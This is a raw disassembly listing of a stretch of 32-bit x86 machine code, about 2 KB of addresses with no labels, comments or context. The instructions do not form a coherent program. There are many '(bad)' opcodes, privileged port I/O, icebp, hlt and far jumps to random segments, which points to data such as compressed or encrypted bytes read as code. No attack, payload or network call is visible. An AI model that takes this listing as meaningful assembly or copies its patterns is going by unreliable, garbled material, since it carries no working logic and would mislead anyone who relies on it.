  41e4f6:	adc    eax,DWORD PTR [ecx+0x22810051]
  41e4fc:	icebp  
  41e4fd:	out    0x4,al
  41e4ff:	addr16 imul eax,eax,0xdb4ca80a
  41e506:	bound  edx,QWORD PTR [ebp-0x7b9d96a8]
  41e50c:	retf   0x968
  41e50f:	call   0x268f:0x489e80e9
  41e516:	push   ds
  41e517:	retf   
  41e518:	push   0xffffffd0
  41e51a:	push   esp
  41e51b:	popa   
  41e51c:	pop    ss
  41e51d:	cwde   
  41e51e:	fimul  DWORD PTR [edi]
  41e520:	ds and eax,0xd202a7ce
  41e526:	rcl    DWORD PTR [edx],cl
  41e528:	dec    edi
  41e529:	mov    ch,0xb7
  41e52b:	and    BYTE PTR [eax],cl
  41e52d:	dec    ebp
  41e52e:	fcmovne st,st(7)
  41e530:	jno    0x41e555
  41e532:	lods   al,BYTE PTR ds:[esi]
  41e533:	loope  0x41e56a
  41e535:	lds    edi,FWORD PTR [esi]
  41e537:	add    bh,BYTE PTR [ebp+0x4f]
  41e53a:	lods   eax,DWORD PTR ds:[esi]
  41e53b:	lods   al,BYTE PTR ds:[esi]
  41e53c:	daa    
  41e53d:	push   ebx
  41e53e:	xchg   edx,eax
  41e53f:	dec    ecx
  41e540:	(bad)  
  41e541:	inc    ebx
  41e542:	mov    ds:0x7d4231dc,al
  41e547:	shl    BYTE PTR [eax-0x77],cl
  41e54a:	sbb    ecx,eax
  41e54c:	dec    DWORD PTR [eax+0x7ef74524]
  41e552:	ins    DWORD PTR es:[edi],dx
  41e553:	jb     0x41e4f5
  41e555:	ins    BYTE PTR es:[edi],dx
  41e556:	loopne 0x41e50d
  41e558:	stos   BYTE PTR es:[edi],al
  41e559:	pop    edi
  41e55a:	mov    ebx,es
  41e55c:	aas    
  41e55d:	and    edi,DWORD PTR [ecx+0x68494408]
  41e563:	pop    esi
  41e564:	imul   edi,DWORD PTR [edx-0x49230d8c],0x59
  41e56b:	popa   
  41e56c:	add    esi,DWORD PTR [esi+eiz*4]
  41e56f:	adc    al,0x9d
  41e571:	sub    bl,BYTE PTR [edx]
  41e573:	cmp    ecx,DWORD PTR [edx]
  41e575:	test   BYTE PTR [esi],cl
  41e577:	retf   0xf1a5
  41e57a:	int    0xa8
  41e57c:	jae    0x41e555
  41e57e:	dec    ecx
  41e57f:	mov    DWORD PTR [esi+ecx*1+0x5021c761],esp
  41e586:	fild   QWORD PTR [eax]
  41e588:	ja     0x41e585
  41e58a:	add    ah,BYTE PTR [ecx-0x7a]
  41e58d:	jle    0x41e5e6
  41e58f:	push   ecx
  41e590:	or     eax,0xfd2eefb
  41e595:	(bad)  
  41e596:	jo     0x41e545
  41e598:	lds    ebx,FWORD PTR [edx]
  41e59a:	clc    
  41e59b:	retf   
  41e59c:	aas    
  41e59d:	mov    dh,0x68
  41e59f:	out    0x3d,al
  41e5a1:	mov    esi,0xaa7eb230
  41e5a6:	xchg   esi,eax
  41e5a7:	daa    
  41e5a8:	in     al,0x6
  41e5aa:	or     BYTE PTR [eax],dl
  41e5ac:	cdq    
  41e5ad:	scas   al,BYTE PTR es:[edi]
  41e5ae:	jo     0x41e5de
  41e5b0:	dec    esp
  41e5b1:	inc    edi
  41e5b2:	xchg   esp,eax
  41e5b3:	hlt    
  41e5b4:	popa   
  41e5b5:	aam    0xa7
  41e5b7:	xor    ebp,DWORD PTR [ebp-0x52]
  41e5ba:	mov    bl,0x71
  41e5bc:	js     0x41e597
  41e5be:	xor    eax,0x328d8d21
  41e5c3:	cmp    DWORD PTR [ebx],ebp
  41e5c5:	and    al,0xf
  41e5c7:	inc    ebx
  41e5c8:	xor    eax,0x1924c38d
  41e5cd:	inc    edi
  41e5ce:	mov    bh,0xd4
  41e5d0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e5d1:	jbe    0x41e62c
  41e5d3:	lahf   
  41e5d4:	xchg   esp,eax
  41e5d5:	sahf   
  41e5d6:	adc    BYTE PTR [ebx],bl
  41e5d8:	inc    eax
  41e5d9:	and    BYTE PTR [esi+eiz*1-0x4a],dh
  41e5dd:	hlt    
  41e5de:	aam    0x36
  41e5e0:	dec    BYTE PTR [eax]
  41e5e2:	pop    esi
  41e5e3:	xchg   edx,eax
  41e5e4:	retf   
  41e5e5:	mov    cl,0xc1
  41e5e7:	mov    bl,0x25
  41e5e9:	fcmovnu st,st(7)
  41e5eb:	jbe    0x41e60a
  41e5ed:	in     eax,0x44
  41e5ef:	dec    ebp
  41e5f0:	enter  0x86ec,0x5d
  41e5f4:	or     bl,BYTE PTR ds:0x33fd4b14
  41e5fa:	int3   
  41e5fb:	inc    ecx
  41e5fc:	out    dx,al
  41e5fd:	mov    bh,0x66
  41e5ff:	shr    eax,cl
  41e601:	sahf   
  41e602:	repnz cmc 
  41e604:	jne    0x41e5e6
  41e606:	and    bl,bh
  41e608:	xchg   edx,eax
  41e609:	in     al,dx
  41e60a:	inc    ecx
  41e60b:	lods   eax,DWORD PTR ds:[esi]
  41e60c:	ret    0xd418
  41e60f:	jno    0x41e5bc
  41e611:	cmp    ch,BYTE PTR [esi-0x7]
  41e614:	lahf   
  41e615:	mov    eax,ds:0x3d41c641
  41e61a:	fdiv   st(5),st
  41e61c:	dec    ebp
  41e61d:	lock cli 
  41e61f:	mov    eax,0x20b43a50
  41e624:	and    cl,BYTE PTR [edx-0x3e4549f1]
  41e62a:	sub    ch,ah
  41e62c:	mov    al,ds:0x1fd87223
  41e631:	(bad)  
  41e632:	icebp  
  41e633:	sar    BYTE PTR [edi-0x2e6255c],cl
  41e639:	push   edi
  41e63a:	inc    ebp
  41e63b:	(bad)  
  41e63c:	cmp    BYTE PTR [edi],0x90
  41e63f:	(bad)  
  41e640:	pusha  
  41e641:	xor    ecx,eax
  41e643:	clc    
  41e644:	imul   eax,DWORD PTR [eax*8+0x662617e2],0x15
  41e64c:	fcomp  QWORD PTR [ebx-0x7739dd5e]
  41e652:	mov    bh,0x2a
  41e654:	out    0x8,eax
  41e656:	xchg   DWORD PTR [edx],esp
  41e658:	in     eax,dx
  41e659:	mov    dl,0xc
  41e65b:	jg     0x41e5e9
  41e65d:	sti    
  41e65e:	mov    edx,0x57040025
  41e663:	dec    ebp
  41e664:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e665:	adc    BYTE PTR [ecx+esi*8],cl
  41e668:	(bad)  
  41e669:	xor    al,0xa2
  41e66b:	mov    dh,0x15
  41e66d:	enter  0x7335,0xf0
  41e671:	int3   
  41e672:	je     0x41e697
  41e674:	push   0x2876ab1f
  41e679:	dec    esp
  41e67a:	or     DWORD PTR [eax+0x2],eax
  41e67d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e67e:	and    bh,BYTE PTR [esp+ebp*4]
  41e681:	retf   
  41e682:	xchg   BYTE PTR [ecx],dh
  41e684:	dec    ecx
  41e685:	pop    ebx
  41e686:	push   esp
  41e687:	addr16 mov ds:0x6d52,al
  41e68b:	add    eax,0x911f976d
  41e690:	loope  0x41e6e1
  41e692:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e693:	int3   
  41e694:	std    
  41e695:	cmp    al,0xc4
  41e697:	dec    edx
  41e698:	push   edx
  41e699:	inc    eax
  41e69a:	mov    ds:0x39749657,eax
  41e69f:	dec    esp
  41e6a0:	lea    ebp,[esi-0xac33792]
  41e6a6:	mov    bl,0xcb
  41e6a8:	pop    ecx
  41e6a9:	cdq    
  41e6aa:	loopne 0x41e64f
  41e6ac:	andps  xmm1,XMMWORD PTR [ecx+0x373ad5e1]
  41e6b3:	in     al,0xa4
  41e6b5:	pop    ebp
  41e6b6:	imul   edx,DWORD PTR [ebx],0x7
  41e6b9:	and    ebx,DWORD PTR [eax+0x6f4cbb3f]
  41e6bf:	cmp    al,dh
  41e6c1:	inc    edi
  41e6c2:	cmc    
  41e6c3:	ret    
  41e6c4:	push   edi
  41e6c5:	cmp    bh,BYTE PTR [edx]
  41e6c7:	jmp    0x41e6b2
  41e6c9:	push   0xffffff85
  41e6cb:	rcl    BYTE PTR [edx-0x3b683e91],1
  41e6d1:	bound  esi,QWORD PTR [edi-0x4a]
  41e6d4:	dec    edx
  41e6d5:	es xchg edi,eax
  41e6d7:	popf   
  41e6d8:	out    0xb,al
  41e6da:	ds in  eax,0xcd
  41e6dd:	in     al,dx
  41e6de:	repnz popf 
  41e6e0:	js     0x41e6be
  41e6e2:	lahf   
  41e6e3:	shl    BYTE PTR [ebx-0x2b],1
  41e6e6:	repz (bad) 
  41e6e8:	pop    esi
  41e6e9:	jb     0x41e684
  41e6eb:	dec    edi
  41e6ec:	outs   dx,BYTE PTR ds:[esi]
  41e6ed:	(bad)  
  41e6ee:	imul   edi,DWORD PTR [ebx-0xc],0xfffffff2
  41e6f2:	out    0xae,eax
  41e6f4:	pop    ds
  41e6f5:	lods   al,BYTE PTR ds:[esi]
  41e6f6:	test   BYTE PTR [ebx+eiz*4],al
  41e6f9:	jmp    0x7a95:0x421f9595
  41e700:	(bad)  
  41e701:	ds int 0xfb
  41e704:	mov    bh,0xb6
  41e706:	lock leave 
  41e708:	mov    BYTE PTR [ecx],cl
  41e70a:	jb     0x41e786
  41e70c:	popf   
  41e70d:	inc    ebx
  41e70e:	mov    ch,0x8f
  41e710:	dec    esi
  41e711:	sbb    al,0x86
  41e713:	pop    sp
  41e715:	icebp  
  41e716:	cmc    
  41e717:	fdivr  st,st(0)
  41e719:	int3   
  41e71a:	pop    es
  41e71b:	aam    0x6e
  41e71d:	jge    0x41e6db
  41e71f:	add    DWORD PTR [edx+0x18],ebx
  41e722:	sahf   
  41e723:	or     al,0xca
  41e725:	xchg   ebp,eax
  41e726:	test   al,0xc3
  41e728:	clc    
  41e729:	pushf  
  41e72a:	jle    0x41e793
  41e72c:	jmp    edx
  41e72e:	(bad)  
  41e72f:	fsubrp st(0),st
  41e731:	mov    dl,0xa3
  41e733:	and    bl,BYTE PTR [ecx+ebx*4+0x0]
  41e737:	lahf   
  41e738:	dec    edx
  41e739:	sar    esp,0x40
  41e73c:	sbb    ch,dl
  41e73e:	sahf   
  41e73f:	std    
  41e740:	push   ss
  41e741:	fidiv  WORD PTR [eax-0x28]
  41e744:	daa    
  41e745:	add    bh,BYTE PTR [ecx+0x26]
  41e748:	fild   QWORD PTR [eax+edx*1]
  41e74b:	adc    edi,DWORD PTR [eax+esi*8]
  41e74e:	out    0x3e,eax
  41e750:	(bad)  
  41e751:	gs pop ebp
  41e753:	add    al,0x27
  41e755:	std    
  41e756:	cs mov dl,0x1d
  41e759:	xor    ecx,DWORD PTR [ebx+0x15b413f4]
  41e75f:	jae    0x41e726
  41e761:	inc    ebx
  41e762:	jnp    0x41e731
  41e764:	cmp    esp,esp
  41e766:	inc    esi
  41e767:	aam    0xd8
  41e769:	pop    edx
  41e76a:	arpl   WORD PTR [esi+0x3e6e8490],si
  41e770:	mov    ecx,DWORD PTR [ecx]
  41e772:	jne    0x41e709
  41e774:	or     DWORD PTR [esi+0x21],edi
  41e777:	sbb    al,0x14
  41e779:	pushf  
  41e77a:	xor    al,0x9e
  41e77c:	mov    BYTE PTR [eax+0x64050b96],dh
  41e782:	xchg   edi,eax
  41e783:	clc    
  41e784:	pop    ds
  41e785:	sbb    BYTE PTR [edx],cl
  41e787:	push   ds
  41e788:	cli    
  41e789:	cmp    BYTE PTR [eax],ah
  41e78b:	jecxz  0x41e78a
  41e78d:	mov    edi,0x2d9a042d
  41e792:	iret   
  41e793:	(bad)  [edx-0x72]
  41e796:	dec    edx
  41e797:	hlt    
  41e798:	mov    bh,0xf8
  41e79a:	and    ebx,DWORD PTR [esi+0x7d]
  41e79d:	inc    esi
  41e79e:	xchg   ebx,eax
  41e79f:	push   esp
  41e7a0:	sub    edx,DWORD PTR [ecx-0x300930af]
  41e7a6:	nop
  41e7a7:	sbb    esp,eax
  41e7a9:	call   0x45f73e9f
  41e7ae:	jne    0x41e788
  41e7b0:	aas    
  41e7b1:	es in  al,dx
  41e7b3:	inc    ecx
  41e7b4:	call   0xa1a9228c
  41e7b9:	lods   al,BYTE PTR ds:[esi]
  41e7ba:	(bad)  
  41e7bb:	mov    eax,ds:0x93663bd0
  41e7c0:	cwde   
  41e7c1:	mov    eax,ds:0x8eea0a5
  41e7c6:	pop    edx
  41e7c7:	jno    0x41e799
  41e7c9:	call   0x520e:0xae819cc
  41e7d0:	nop
  41e7d1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e7d2:	in     al,dx
  41e7d3:	push   ds
  41e7d4:	adc    bh,BYTE PTR [ecx+0x62]
  41e7d7:	rol    DWORD PTR [ecx+0x2e],cl
  41e7da:	into   
  41e7db:	sub    edx,eax
  41e7dd:	push   ebp
  41e7de:	xchg   ebx,eax
  41e7df:	cmp    al,0xc8
  41e7e1:	lea    ebx,[edx+ebx*4-0x57]
  41e7e5:	xor    DWORD PTR [edi],edx
  41e7e7:	mov    esi,0xbd30b935
  41e7ec:	pop    esp
  41e7ed:	sub    eax,0x3e1b5f18
  41e7f2:	(bad)  
  41e7f4:	mov    ebp,0xd034cfb6
  41e7f9:	sbb    eax,0x9994fd7
  41e7fe:	lea    edx,[edi]
  41e800:	dec    eax
  41e801:	or     BYTE PTR [ebp+esi*1+0xf],0x5b
  41e806:	mov    al,0xc2
  41e808:	repnz and al,0x28
  41e80b:	mov    WORD PTR [ebx-0x3c],es
  41e80e:	xchg   BYTE PTR [edi+0x62],dh
  41e811:	(bad)  
  41e812:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e813:	aam    0xc8
  41e815:	iret   
  41e816:	aas    
  41e817:	repz mov esp,eax
  41e81a:	cmp    eax,0xe9168828
  41e81f:	dec    esp
  41e820:	and    eax,0xd37d5c19
  41e825:	mov    dl,0xf3
  41e827:	pop    DWORD PTR [ebx+eax*8+0x3c]
  41e82b:	icebp  
  41e82c:	or     BYTE PTR [eax+0x7a5cab27],dl
  41e832:	pop    ds
  41e833:	(bad)  
  41e834:	rcl    bh,1
  41e836:	lds    ecx,FWORD PTR [ecx-0x30]
  41e839:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e83a:	add    ch,BYTE PTR [edx]
  41e83c:	mov    esp,0x9ad30965
  41e841:	fwait
  41e842:	ret    0xebf6
  41e845:	sbb    eax,0xb936495c
  41e84a:	mov    DWORD PTR [edx],edi
  41e84c:	pushf  
  41e84d:	xchg   ecx,eax
  41e84e:	pop    ebp
  41e84f:	and    DWORD PTR [ebp+ebx*4-0x25],esi
  41e853:	and    BYTE PTR [ecx+0x69dd734],0xfc
  41e85a:	retf   0x5096
  41e85d:	(bad)  
  41e85e:	test   BYTE PTR [edi],0xc1
  41e861:	jle    0x41e88a
  41e863:	jp     0x41e7f1
  41e865:	pop    ebx
  41e866:	ss jno 0x41e858
  41e869:	xlat   BYTE PTR ds:[ebx]
  41e86a:	fdivr  QWORD PTR [esi]
  41e86c:	push   0x7f3869dd
  41e871:	dec    esi
  41e872:	adc    edx,DWORD PTR [esi+edx*4+0x707866d9]
  41e879:	push   0x3c
  41e87b:	pop    ecx
  41e87c:	loopne 0x41e83e
  41e87e:	cli    
  41e87f:	mov    ds:0x9ad9ec05,al
  41e884:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e885:	xor    al,0xf2
  41e887:	pop    edi
  41e888:	jge    0x41e86b
  41e88a:	cmp    al,BYTE PTR [esi]
  41e88c:	fisub  WORD PTR ds:[eax+0x3]
  41e890:	mov    eax,ds:0x2b0ac8cc
  41e895:	retf   
  41e896:	add    DWORD PTR [eax+0x6c],esp
  41e899:	(bad)  
  41e89a:	(bad)  
  41e89b:	jo     0x41e8a5
  41e89d:	push   0x59
  41e89f:	fs aad 0xd8
  41e8a2:	cdq    
  41e8a3:	dec    edx
  41e8a4:	sbb    al,0x4a
  41e8a6:	mov    WORD PTR [ecx],?
  41e8a8:	push   0x75cab718
  41e8ad:	mov    esp,0x31d045c
  41e8b2:	sbb    DWORD PTR ds:0x453cec04,eax
  41e8b8:	dec    esi
  41e8b9:	out    dx,al
  41e8ba:	or     eax,0x11793217
  41e8bf:	mov    esi,0x345d9c9
  41e8c4:	pop    ss
  41e8c5:	cmp    eax,0x3a1d7932
  41e8ca:	stos   BYTE PTR es:[edi],al
  41e8cb:	push   ds
  41e8cc:	sbb    ebx,DWORD PTR [edx-0x1]
  41e8cf:	cli    
  41e8d0:	(bad)  
  41e8d1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e8d2:	inc    edi
  41e8d3:	out    dx,al
  41e8d4:	xor    ebx,DWORD PTR [ecx+0x42e83d01]
  41e8da:	rol    BYTE PTR [edx+0x31],1
  41e8dd:	jg     0x41e88b
  41e8df:	inc    edx
  41e8e0:	imul   esi,DWORD PTR [eax],0xffffffbe
  41e8e3:	mov    ds:0x62dc689a,al
  41e8e8:	fwait
  41e8e9:	mov    al,ds:0x336a904d
  41e8ee:	push   esp
  41e8ef:	sti    
  41e8f0:	std    
  41e8f1:	mov    dh,0x84
  41e8f3:	mov    ebx,0x7c27771f
  41e8f8:	and    ah,BYTE PTR [eax]
  41e8fa:	mov    bl,0x3d
  41e8fc:	iret   
  41e8fd:	adc    edi,DWORD PTR [edi-0x62]
  41e900:	sub    BYTE PTR [eax],0xc5
  41e903:	pop    es
  41e904:	arpl   WORD PTR [esp+edi*1-0x4f],di
  41e908:	pop    ds
  41e909:	outs   dx,DWORD PTR ds:[esi]
  41e90a:	out    0x28,al
  41e90c:	jl     0x41e8ee
  41e90e:	jae    0x41e956
  41e910:	es adc al,0x89
  41e913:	add    al,0x5
  41e915:	mov    ebx,DWORD PTR [esi+0x42]
  41e918:	pop    esp
  41e919:	rcl    DWORD PTR [eax],1
  41e91b:	mov    BYTE PTR ds:0xf47f98a3,al
  41e921:	mov    BYTE PTR [ebx-0x7a],bl
  41e924:	adc    eax,0xe0ee8422
  41e929:	std    
  41e92a:	and    ecx,esp
  41e92c:	xor    BYTE PTR [edi-0x9],al
  41e92f:	push   cs
  41e930:	mov    dl,0x78
  41e932:	js     0x903842ac
  41e938:	imul   edx,ebx,0xffffffed
  41e93b:	cli    
  41e93c:	cmp    al,0xdd
  41e93e:	mov    bh,0xe3
  41e940:	jecxz  0x41e94d
  41e942:	cmp    DWORD PTR [eax-0x31141f0f],ebx
  41e948:	adc    BYTE PTR [ebx-0x1961fc72],0xb2
  41e94f:	sbb    al,0x95
  41e951:	dec    esi
  41e952:	data16 int3 
  41e954:	xor    esi,esp
  41e956:	div    DWORD PTR ds:0x71e9b632
  41e95c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e95d:	outs   dx,BYTE PTR ds:[esi]
  41e95e:	mov    esp,0x52fabb42
  41e963:	stc    
  41e964:	iret   
  41e965:	lods   eax,DWORD PTR ds:[esi]
  41e966:	(bad)  
  41e967:	push   eax
  41e968:	das    
  41e969:	cld    
  41e96a:	(bad)  
  41e96b:	or     al,0x3f
  41e96d:	repz add al,0x6b
  41e970:	adc    ecx,DWORD PTR [ebp+0x4a]
  41e973:	fld    DWORD PTR [ebx+0x7]
  41e976:	pop    edx
  41e977:	cmc    
  41e978:	test   eax,0xfebe245a
  41e97d:	jnp    0x41e94b
  41e97f:	mov    ah,0x5f
  41e981:	loope  0x41e9bd
  41e983:	xor    ax,0x8cd8
  41e987:	stos   BYTE PTR es:[edi],al
  41e988:	xlat   BYTE PTR ds:[ebx]
  41e989:	out    dx,eax
  41e98a:	idiv   BYTE PTR [esi+0x466018a1]
  41e990:	adc    BYTE PTR [ebp+0x49e231eb],0x69
  41e997:	pop    ecx
  41e998:	or     al,0x69
  41e99a:	int3   
  41e99b:	sbb    BYTE PTR ds:0xa1d77d9c,cl
  41e9a1:	jg     0x41e9d1
  41e9a3:	add    dl,BYTE PTR [edi]
  41e9a5:	aas    
  41e9a6:	inc    edx
  41e9a7:	and    al,0xc3
  41e9a9:	nop
  41e9aa:	scas   al,BYTE PTR es:[edi]
  41e9ab:	xor    eax,0xb3e3f651
  41e9b0:	popf   
  41e9b1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e9b2:	in     al,dx
  41e9b3:	mov    ah,0x4c
  41e9b5:	add    eax,0x5f8b66a3
  41e9ba:	sub    DWORD PTR [ecx+0xc8df041],edi
  41e9c0:	stos   BYTE PTR es:[edi],al
  41e9c1:	pop    ebx
  41e9c2:	clc    
  41e9c3:	sahf   
  41e9c4:	cmp    eax,0x194b8044
  41e9c9:	xchg   esi,eax
  41e9ca:	jmp    0x41e94f
  41e9cc:	icebp  
  41e9cd:	dec    ebx
  41e9ce:	mov    ah,0xd0
  41e9d0:	inc    ecx
  41e9d1:	adc    al,0xfd
  41e9d3:	push   esp
  41e9d4:	aaa    
  41e9d5:	xor    DWORD PTR [eax],0xc0c30037
  41e9db:	loope  0x41e983
  41e9dd:	jle    0x41e965
  41e9df:	or     ch,BYTE PTR [edx]
  41e9e1:	cld    
  41e9e2:	inc    ebx
  41e9e3:	push   esi
  41e9e4:	cs push eax
  41e9e6:	or     BYTE PTR [edi+0x7],cl
  41e9e9:	shl    BYTE PTR [ecx-0x39],0xb7
  41e9ed:	dec    ebp
  41e9ee:	dec    edi
  41e9ef:	fsubr  DWORD PTR [esi-0x2cf2a91a]
  41e9f5:	test   eax,0x79a32842
  41e9fa:	jnp    0x41e9f8
  41e9fc:	sub    eax,0x6d21b706
  41ea01:	rol    BYTE PTR [eax+0x7911b99],0xcb
  41ea08:	mov    ecx,0xb52bd0cd
  41ea0d:	lea    esi,[eax-0x6ae572a2]
  41ea13:	adc    DWORD PTR [ebp-0x3fbf44a1],ecx
  41ea19:	mov    BYTE PTR [esi-0x14249ff1],ch
  41ea1f:	jns    0x41e9db
  41ea21:	add    al,0xb7
  41ea23:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ea24:	and    BYTE PTR [edi],0xd7
  41ea27:	fld    st(7)
  41ea29:	cmp    DWORD PTR [edx+ebx*4],ebp
  41ea2c:	cmp    eax,0x4a2f6f4
  41ea31:	repnz mov ecx,0xa01cb264
  41ea37:	add    dl,bh
  41ea39:	or     bh,BYTE PTR [ecx-0x62ede04d]
  41ea3f:	xchg   edx,eax
  41ea40:	fld    QWORD PTR ds:0x361b6b0e
  41ea46:	fwait
  41ea47:	pop    ebp
  41ea48:	adc    eax,DWORD PTR [ecx]
  41ea4a:	cmp    esp,eax
  41ea4c:	hlt    
  41ea4d:	fmul   DWORD PTR [ebx-0x29240f13]
  41ea53:	ins    DWORD PTR es:[edi],dx
  41ea54:	ss aas 
  41ea56:	add    edx,DWORD PTR [edi*1+0x1091e1d0]
  41ea5d:	dec    edi
  41ea5e:	pop    ds
  41ea5f:	clc    
  41ea60:	sbb    ebp,ecx
  41ea62:	outs   dx,DWORD PTR ds:[esi]
  41ea63:	adc    BYTE PTR [ebx],bh
  41ea65:	ja     0x41ea35
  41ea67:	ror    bl,cl
  41ea69:	popa   
  41ea6a:	es xchg ebx,eax
  41ea6c:	add    BYTE PTR [ecx+eiz*8],ah
  41ea6f:	xchg   esp,eax
  41ea70:	mov    eax,ds:0xb5eb4483
  41ea75:	xchg   esi,eax
  41ea76:	sahf   
  41ea77:	ins    BYTE PTR es:[edi],dx
  41ea78:	ret    0x57ea
  41ea7b:	jge    0x41ea0b
  41ea7d:	test   DWORD PTR [edi+ebx*1-0x85a677a],edi
  41ea84:	ss mov esi,0xc5e5f82
  41ea8a:	mov    al,al
  41ea8c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ea8d:	pop    eax
  41ea8e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ea8f:	inc    ebx
  41ea90:	push   es
  41ea91:	repz xchg ebx,eax
  41ea93:	shl    BYTE PTR [eax],0x7a
  41ea96:	push   es
  41ea97:	add    DWORD PTR [ebp-0x64],edi
  41ea9a:	leave  
  41ea9b:	or     BYTE PTR [ebx+eax*2-0x2bd86d00],0xc4
  41eaa3:	cmp    DWORD PTR [eax-0x40],0x9fb89d2d
  41eaaa:	add    cl,0x9d
  41eaad:	addr16 adc al,0x8d
  41eab0:	add    BYTE PTR [ebx+0x55a2dd81],dl
  41eab6:	fiadd  DWORD PTR [edx]
  41eab8:	je     0x41eabc
  41eaba:	xchg   BYTE PTR [edi+0x79],ah
  41eabd:	cwde   
  41eabe:	sub    edi,DWORD PTR [ebp-0x6b]
  41eac1:	rcl    BYTE PTR [edi+edx*4-0x75],0xaa
  41eac6:	pop    bp
  41eac8:	sub    al,0xc7
  41eaca:	push   esp
  41eacb:	rcl    DWORD PTR [esi+esi*2+0x74],1
  41eacf:	cmp    BYTE PTR [edx-0x45],dh
  41ead2:	std    
  41ead3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ead4:	shr    dh,0xbd
  41ead7:	mov    dl,0x46
  41ead9:	in     al,0x4
  41eadb:	fadd   DWORD PTR [ebp-0x62]
  41eade:	and    al,0x6b
  41eae0:	mov    ebx,0x4822193d
  41eae5:	jle    0x41eb45
  41eae7:	arpl   ax,si
  41eae9:	in     al,0xbe
  41eaeb:	inc    edi
  41eaec:	neg    DWORD PTR [ecx+0x46]
  41eaef:	xor    DWORD PTR [edx],ecx
  41eaf1:	push   ebp
  41eaf2:	imul   eax,DWORD PTR [esi-0x1fca3b53],0x2
  41eaf9:	jno    0x41eb79
  41eafb:	jmp    0x41eae8
  41eafd:	pop    edx
  41eafe:	cvttps2pi mm5,QWORD PTR [edi+ebx*4-0x75]
  41eb03:	xchg   DWORD PTR [ebp-0x2d],edi
  41eb06:	(bad)  
  41eb07:	jae    0x41eb18
  41eb09:	into   
  41eb0a:	shl    BYTE PTR [ecx+0x6a],0xa7
  41eb0e:	cmp    cl,BYTE PTR [ebp-0x2e]
  41eb11:	(bad)  
  41eb12:	jmp    0xb1ff:0x2d06044
  41eb19:	gs jge 0x41eb86
  41eb1c:	imul   edi,ecx,0xffffffa5
  41eb1f:	stc    
  41eb20:	cs push eax
  41eb22:	sub    eax,0x9cf3b6c
  41eb27:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41eb28:	fwait
  41eb29:	es jno 0x41eb4b
  41eb2c:	fwait
  41eb2d:	outs   dx,DWORD PTR ds:[esi]
  41eb2e:	sub    al,0xc0
  41eb30:	jp     0x41eb23
  41eb32:	jge    0x41eb52
  41eb34:	jmp    0xb2130065
  41eb39:	mov    eax,0xc6a23cec
  41eb3e:	adc    eax,0x9aa1820e
  41eb43:	test   al,0xc4
  41eb45:	aaa    
  41eb46:	jo     0x41eb09
  41eb48:	pop    ds
  41eb49:	dec    esp
  41eb4a:	outs   dx,BYTE PTR ds:[esi]
  41eb4b:	pushf  
  41eb4c:	call   0xacd:0xb87629d4
  41eb53:	in     eax,0x2a
  41eb55:	or     eax,0xfd7fe757
  41eb5a:	cli    
  41eb5b:	sub    eax,ebp
  41eb5d:	xchg   ecx,eax
  41eb5e:	test   eax,0x6e8db507
  41eb63:	jmp    0xfef8:0x5918271e
  41eb6a:	pop    ebp
  41eb6b:	sub    DWORD PTR [ebx+edi*2+0x3088dd78],0x6d03f3c0
  41eb76:	or     BYTE PTR [ebp+0x15],ch
  41eb79:	xchg   edi,eax
  41eb7a:	int3   
  41eb7b:	lods   al,BYTE PTR ds:[esi]
  41eb7c:	add    eax,0x6de3ca85
  41eb81:	(bad)  
  41eb82:	mov    bl,0xfd
  41eb84:	xchg   BYTE PTR [ebx+ebx*1],bh
  41eb87:	and    DWORD PTR ds:0x8ce4a0b4,eax
  41eb8d:	repz call 0xc1fe:0xf9e63e76
  41eb95:	sbb    dl,dl
  41eb97:	dec    ebp
  41eb98:	clc    
  41eb99:	push   ecx
  41eb9a:	int    0xb9
  41eb9c:	mov    bl,0xfc
  41eb9e:	rcr    DWORD PTR [edi],1
  41eba0:	xor    bp,WORD PTR cs:[ebx-0x38]
  41eba5:	ins    DWORD PTR es:[edi],dx
  41eba6:	xchg   edi,eax
  41eba7:	and    ebp,DWORD PTR [esi+0x2b]
  41ebaa:	adc    ebx,eax
  41ebac:	jne    0x41ebc0
  41ebae:	aam    0x80
  41ebb0:	inc    esi
  41ebb1:	(bad)  [edi+eiz*8+0x28efc615]
  41ebb8:	dec    edi
  41ebb9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ebba:	lds    ebx,FWORD PTR [edi]
  41ebbc:	(bad)  
  41ebbd:	out    dx,eax
  41ebbe:	jmp    0xfbc6903a
  41ebc3:	les    edi,FWORD PTR [esi]
  41ebc5:	bound  ecx,QWORD PTR [edx-0x7b77e067]
  41ebcb:	aad    0x76
  41ebcd:	push   0x1b28dca0
  41ebd2:	arpl   WORD PTR [esi+0x594b2fb7],si
  41ebd8:	int3   
  41ebd9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ebda:	popf   
  41ebdb:	fdiv   st,st(7)
  41ebdd:	mov    edi,gs
  41ebdf:	fsub   QWORD PTR [edx-0x302cb947]
  41ebe5:	icebp  
  41ebe6:	cmp    al,0xf6
  41ebe8:	(bad)  
  41ebe9:	rcl    cl,1
  41ebeb:	fbstp  TBYTE PTR [esi+0x7f]
  41ebee:	pop    es
  41ebef:	test   al,0xe4
  41ebf1:	jno    0x41ec1a
  41ebf3:	lods   al,BYTE PTR ds:[esi]
  41ebf4:	aaa    
  41ebf5:	xor    cl,BYTE PTR [eax+edi*1+0x6526435a]
  41ebfc:	jo     0x41eb84
  41ebfe:	adc    ah,al
  41ec00:	dec    ebp
  41ec01:	dec    ebp
  41ec02:	inc    edi
  41ec03:	push   ecx
  41ec04:	cmp    eax,0xad57e53b
  41ec09:	cmp    BYTE PTR [edx-0xe],ah
